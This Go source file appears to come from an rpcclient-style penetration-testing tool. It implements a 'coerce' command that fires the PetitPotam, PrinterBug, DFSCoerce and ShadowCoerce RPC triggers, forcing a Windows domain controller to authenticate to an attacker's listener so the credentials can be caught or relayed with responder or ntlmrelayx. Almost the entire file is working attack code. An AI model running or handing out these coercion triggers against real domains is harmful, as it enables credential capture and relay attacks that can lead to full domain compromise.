package commands

import (
	"fmt"
	"strings"

	"github.com/0xbbuddha/rpcclient-ng/internal/output"
	"github.com/0xbbuddha/rpcclient-ng/internal/session"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	netdfs "github.com/oiweiwei/go-msrpc/msrpc/dfsnm/netdfs/v3"
	efsrpc "github.com/oiweiwei/go-msrpc/msrpc/efsr/efsrpc/v1"
	vss "github.com/oiweiwei/go-msrpc/msrpc/fsrvp/fileservervssagent/v1"
	winspool "github.com/oiweiwei/go-msrpc/msrpc/rprn/winspool/v1"
)

// A coercion vector fires one RPC trigger that makes the target DC authenticate
// back to listener; the auth is caught out-of-band (responder / ntlmrelayx).
// fire returns the server's response text, or an error if the interface could
// not even be reached (pipe absent / access denied).
type coercer struct {
	name string
	fire func(s *session.Session, listener string) (string, error)
}

var coercers = []coercer{
	{"efsr", fireEFSR},   // MS-EFSR  (PetitPotam)
	{"rprn", fireRPRN},   // MS-RPRN  (PrinterBug)
	{"dfsnm", fireDFSNM}, // MS-DFSNM (DFSCoerce)
	{"fsrvp", fireFSRVP}, // MS-FSRVP (ShadowCoerce)
}

var coerceCmd = &Command{
	Name:  "coerce",
	Usage: "coerce <listener> [efsr|rprn|dfsnm|fsrvp|all]",
	Help:  "Coerce the DC to authenticate to <listener> via EFSR/RPRN/DFSNM/FSRVP (PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce). Catch the auth with responder or ntlmrelayx.",
	Run:   coerceRun,
}

func coerceRun(s *session.Session, out *output.Printer, args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: coerce <listener> [efsr|rprn|dfsnm|fsrvp|all]")
	}
	listener := args[0]
	sel := "all"
	if len(args) > 1 {
		sel = strings.ToLower(args[1])
	}
	out.Infof("coercing %s -> %s (run a listener, e.g. responder/ntlmrelayx, on %s)",
		s.Config().Target, listener, listener)

	matched := false
	for _, c := range coercers {
		if sel != "all" && sel != c.name {
			continue
		}
		matched = true
		status, err := c.fire(s, listener)
		if err != nil {
			out.Dangerf("  %-6s unavailable: %v", c.name, err)
			continue
		}
		out.Infof("  %-6s trigger sent | server: %s", c.name, status)
	}
	if !matched {
		return fmt.Errorf("unknown method %q (efsr|rprn|dfsnm|fsrvp|all)", sel)
	}
	return nil
}

// srvStatus describes the trigger's server response; a non-nil error here still
// means the trigger was delivered (the DC typically rejects the bogus path only
// after attempting to reach it).
func srvStatus(err error) string {
	if err == nil {
		return "OK"
	}
	return err.Error()
}

func unc(listener, rest string) string { return `\\` + listener + rest }

func fireEFSR(s *session.Session, listener string) (string, error) {
	var cli efsrpc.EfsrpcClient
	if err := s.BindPipe("lsarpc", func(cc dcerpc.Conn, sec ...dcerpc.Option) error {
		c, e := efsrpc.NewEfsrpcClient(s.Context(), cc, sec...)
		cli = c
		return e
	}); err != nil {
		return "", err
	}
	_, err := cli.OpenFileRaw(s.Context(), &efsrpc.OpenFileRawRequest{
		FileName: unc(listener, `\share\file.txt`),
	})
	return srvStatus(err), nil
}

func fireRPRN(s *session.Session, listener string) (string, error) {
	var cli winspool.WinspoolClient
	if err := s.BindPipe("spoolss", func(cc dcerpc.Conn, sec ...dcerpc.Option) error {
		c, e := winspool.NewWinspoolClient(s.Context(), cc, sec...)
		cli = c
		return e
	}); err != nil {
		return "", err
	}
	op, err := cli.OpenPrinter(s.Context(), &winspool.OpenPrinterRequest{
		PrinterName:      `\\` + s.Config().Target,
		DevModeContainer: &winspool.DevModeContainer{},
	})
	if err != nil {
		return "", fmt.Errorf("OpenPrinter: %w", err)
	}
	_, nerr := cli.RemoteFindFirstPrinterChangeNotificationEx(s.Context(), &winspool.RemoteFindFirstPrinterChangeNotificationExRequest{
		Printer:      op.Handle,
		Flags:        0x00000100, // PRINTER_CHANGE_ADD_JOB
		LocalMachine: `\\` + listener,
	})
	return srvStatus(nerr), nil
}

func fireDFSNM(s *session.Session, listener string) (string, error) {
	var cli netdfs.NetdfsClient
	if err := s.BindPipe("netdfs", func(cc dcerpc.Conn, sec ...dcerpc.Option) error {
		c, e := netdfs.NewNetdfsClient(s.Context(), cc, sec...)
		cli = c
		return e
	}); err != nil {
		return "", err
	}
	_, err := cli.AddStdRoot(s.Context(), &netdfs.AddStdRootRequest{
		ServerName: listener,
		RootShare:  "share",
		Flags:      1,
	})
	return srvStatus(err), nil
}

func fireFSRVP(s *session.Session, listener string) (string, error) {
	var cli vss.FileServerVSSAgentClient
	if err := s.BindPipe("FssagentRpc", func(cc dcerpc.Conn, sec ...dcerpc.Option) error {
		c, e := vss.NewFileServerVSSAgentClient(s.Context(), cc, sec...)
		cli = c
		return e
	}); err != nil {
		return "", err
	}
	_, err := cli.IsPathSupported(s.Context(), &vss.IsPathSupportedRequest{
		ShareName: unc(listener, `\share\`),
	})
	return srvStatus(err), nil
}
